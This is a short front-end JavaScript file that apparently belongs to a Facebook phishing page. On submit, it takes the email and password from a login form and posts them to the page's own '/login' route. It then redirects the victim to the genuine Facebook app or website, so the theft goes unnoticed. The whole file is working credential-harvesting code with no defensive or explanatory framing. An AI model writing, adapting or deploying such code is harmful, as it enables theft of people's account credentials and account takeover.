// public/js/main.js
const loginForm = document.getElementById('loginForm');

loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Create data object
    const formData = {
        email,
        password
    };


    await fetch('/login', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(formData)
    });

    navigateToFacebook()
});

// Function to handle Facebook navigation
function navigateToFacebook() {
    // Check if the device is mobile
    const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
    console.log(isMobile)
    if (isMobile) {
        // Try to open Facebook app
        const fbAppUrl = "fb://profile";
        const fbWebUrl = "https://m.facebook.com/"; // Mobile web fallback

        // Create a timeout to redirect to mobile web if app doesn't open
        const timeout = setTimeout(() => {
            window.location.href = fbWebUrl;
        }, 2500);

        // Try to open the app
        window.location.href = fbAppUrl;

        // Listen for visibility change
        document.addEventListener("visibilitychange", () => {
            if (!document.hidden) {
                clearTimeout(timeout);
                window.location.href = fbWebUrl;
            }
        });
    } else {
        // Desktop users - redirect to main Facebook website
        window.location.href = "https://www.facebook.com/";
    }
}